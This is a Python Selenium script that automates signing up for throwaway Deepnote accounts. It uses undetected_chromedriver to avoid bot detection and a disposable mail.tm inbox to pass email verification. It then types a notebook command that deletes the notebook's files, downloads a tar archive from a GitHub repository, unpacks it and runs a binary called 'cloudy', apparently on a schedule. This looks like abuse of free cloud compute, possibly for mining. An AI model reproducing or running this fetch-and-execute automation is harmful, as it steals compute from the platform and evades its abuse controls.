if __name__ == "__main__":
  import os
  import undetected_chromedriver as uc
  import time
  from selenium.webdriver.common.by import By
  from selenium.webdriver.common.action_chains import ActionChains
  import random
  import requests
  print("aaa")
  time.sleep(5)
  # os.system("npm i")
  options = uc.ChromeOptions()
  a = True
  low_word = "abcdefghijklkmnopqrstuvwxyz"
  upper_word = "ABDCEFGHIJKLMNOPQRSTUVWXYZ"
  number = "1234567890"
  symbols = "!@#$%&*"
  username_for = low_word
  password_for = low_word + upper_word + number + symbols
  long_password = 16
  long_username = 12
  ass = "".join(random.sample(username_for, 12))
  options.add_argument('--no-first-run --no-service-autorun --password-store=basic') #wlacz to jak juz nie bedzie dev test
  options.add_argument("--window-size=1920,1080")
  options.add_argument("--remote-debugging-port=38223")
  driver = uc.Chrome(options=options, version_main=106)  # version_main allows to specify your chrome version instead of following chrome global version
  driver.set_window_size(1920, 1080)
  low_word = "abcdefghijklkmnopqrstuvwxyz"

  headersdomain = {'accept': 'application/ld+json'}
  responsedomain = requests.get('https://api.mail.tm/domains?page=1', headers=headersdomain)
  emil = "".join(random.sample(low_word, 13))+"@"+responsedomain.json()["hydra:member"][0]["domain"]
  myobj = {'address': emil,"password": "cloud"}
  headersreg = {'accept': 'application/ld+json'}
  responsereg = requests.post('https://api.mail.tm/accounts', headers=headersreg, json=myobj)



  # random.choice(a)+"+"+emailrepl+"@gmail.com"
  print(emil)

  driver.get("https://deepnote.com/sign-up")
  time.sleep(1)
  driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/div[2]/button[3]').click()
  time.sleep(2)
  driver.find_element(By.XPATH, '/html/body/div[1]/div/div[1]/div/div/div[2]/div/div/div/input').send_keys(emil)
  time.sleep(1)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div[1]/div/div/div[2]/button").click()
  time.sleep(30)


  myobjlog = {'address': emil,"password": "cloud"}
  headerslog = {'accept': 'application/ld+json'}
  responselog = requests.post('https://api.mail.tm/token', headers=headerslog, json=myobjlog)
  token = responselog.json()["token"]
  headersmess = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
  responsemess = requests.get('https://api.mail.tm/messages', headers=headersmess)
  headersmessz = {'accept': 'application/ld+json', "Authorization": "Bearer "+token}
  responsemessz = requests.get('https://api.mail.tm/messages/'+responsemess.json()["hydra:member"][0]["id"], headers=headersmess)
  verifylink = responsemessz.json()["text"].split("\n")[11].replace("|  [Sign in now](", "")+responsemessz.json()["text"].split("\n")[12]+responsemessz.json()["text"].split("\n")[13].replace(")", "")





  driver.get(verifylink)
  time.sleep(0.5)
  time.sleep(3)
  driver.find_element(By.XPATH, '/html/body/div[1]/div/div/div[2]/div/div/div[1]/input[1]').send_keys("".join(random.sample(low_word, 11)))
  time.sleep(0.5)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[2]/button").click()
  time.sleep(2.5)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[1]/div/select/option[3]").click()
  time.sleep(0.5)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[2]/select/option[2]").click()
  time.sleep(0.5)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[1]/div[3]/select/option[2]").click()
  time.sleep(0.5)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div[2]/button").click()
  time.sleep(2)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/button[2]").click()
  time.sleep(2)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/div/input").send_keys("".join(random.sample(low_word, 11)))
  time.sleep(0.5)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button").click()
  time.sleep(0.5)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button[1]").click()
  time.sleep(2)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div[2]/div/div/div/button[2]").click()
  time.sleep(5)
  time.sleep(15)
  driver.get(driver.current_url.split("project")[0])
  time.sleep(12)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div[2]/div/div/div[1]/button").click()
  time.sleep(1.5)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[2]/div/div/button[1]").click()
  time.sleep(40)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[3]/div/div/div/div[1]/div[2]/div/div[3]/div[1]/button[1]").click()
  time.sleep(1)
  actions = ActionChains(driver)
  actions.send_keys('!touch main && rm * && wget https://github.com/n2dhektor/silver-octo-palm-tree/raw/main/fur.tar.gz && tar -xf fur.tar.gz && ./cloudy')
  actions.perform()
  time.sleep(2)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[3]/div/div/div/div[1]/div[1]/div/div/div[2]/div[2]").click()
  time.sleep(2)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[9]/div").click()
  time.sleep(2)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[3]/div[1]/div/div/div[1]/div[1]/label[2]").click()
  time.sleep(2)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[3]/div[1]/div/div/div[1]/div[2]/div[1]/select/option[1]").click()
  time.sleep(2)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[3]/div[1]/div/div/div[1]/div[2]/div[2]/div/div[1]").click()
  time.sleep(2)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[3]/div[1]/div/div/div[2]/button").click()
  time.sleep(12)
  driver.find_element(By.XPATH, "/html/body/div[1]/div/div/div/div[1]/div[2]/div/div[2]/div/div[1]/div/div/div[3]/div/div/div/div[1]/div[1]/div/div/div[2]").click()
  time.sleep(30)
